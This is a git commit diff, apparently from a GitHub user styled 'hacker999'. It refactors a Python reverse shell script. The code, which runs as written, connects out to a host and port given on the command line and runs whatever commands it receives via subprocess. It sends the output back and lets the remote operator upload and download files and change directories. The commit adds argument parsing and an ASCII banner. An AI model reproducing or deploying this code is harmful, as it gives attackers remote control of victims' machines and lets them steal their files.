e7fc45cf587e86a588e9cda36dc8fa3c87606614
hacker999 <164253133+Killsecstasy@users.noreply.github.com>
2025-03-07 17:54:17 +0700

    reverse_shell.py

--- reverse_shell.py
+++ reverse_shell.py
@@ -1,36 +1,30 @@
 import socket
 import subprocess
 import os
+import argparse
 
-def main():
-    # ASCII Art Banner
+def show_banner():
     banner = """
  ██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗    ███████╗██╗  ██╗███████╗██╗     ██╗     
 ██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔════╝██║  ██║██╔════╝██║     ██║     
 ██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗█████╗███████╗███████║█████╗  ██║     ██║     
 ██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝╚════╝╚════██║██╔══██║██╔══╝  ██║     ██║     
 ██║  ██║███████╗ ╚████╔╝ ███████╗██║  ██║███████║███████╗    ███████║██║  ██║███████╗███████╗███████╗
-╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝                                                                                                   
+╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
     """
     print(banner)
 
-    # Replace with your IP address and port
-    target_ip = 'YOUR_IP_ADDRESS'
-    target_port ='YOUR_PORT'
-
-    # Create a socket object
+def main(target_ip, target_port):
+    show_banner()
+    
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    # Connect to the target
     s.connect((target_ip, target_port))
-
+    
     while True:
-        # Receive the command from the attacker
         command = s.recv(1024).decode()
 
         if command.lower() == 'exit':
             break
-
         elif command[:6] == 'upload':
             filename = command[7:]
             with open(filename, 'wb') as f:
@@ -39,7 +33,6 @@ def main():
                     f.write(data)
                     data = s.recv(4096)
             s.send(str.encode('File uploaded successfully\n'))
-
         elif command[:8] == 'download':
             filename = command[9:]
             if os.path.exists(filename):
@@ -51,17 +44,19 @@ def main():
                 s.send(str.encode('File downloaded successfully\n'))
             else:
                 s.send(str.encode('File not found\n'))
-
         elif command[:2] == 'cd':
             os.chdir(command[3:])
             s.send(str.encode(os.getcwd() + '> '))
-
         else:
             output = subprocess.getoutput(command)
             s.send(str.encode(output + '\n'))
-
-    # Close the connection
+    
     s.close()
 
 if __name__ == "__main__":
-    main()
+    parser = argparse.ArgumentParser(description="Reverse Shell Script")
+    parser.add_argument("target_ip", help="Target IP address")
+    parser.add_argument("target_port", type=int, help="Target Port")
+    args = parser.parse_args()
+    
+    main(args.target_ip, args.target_port)
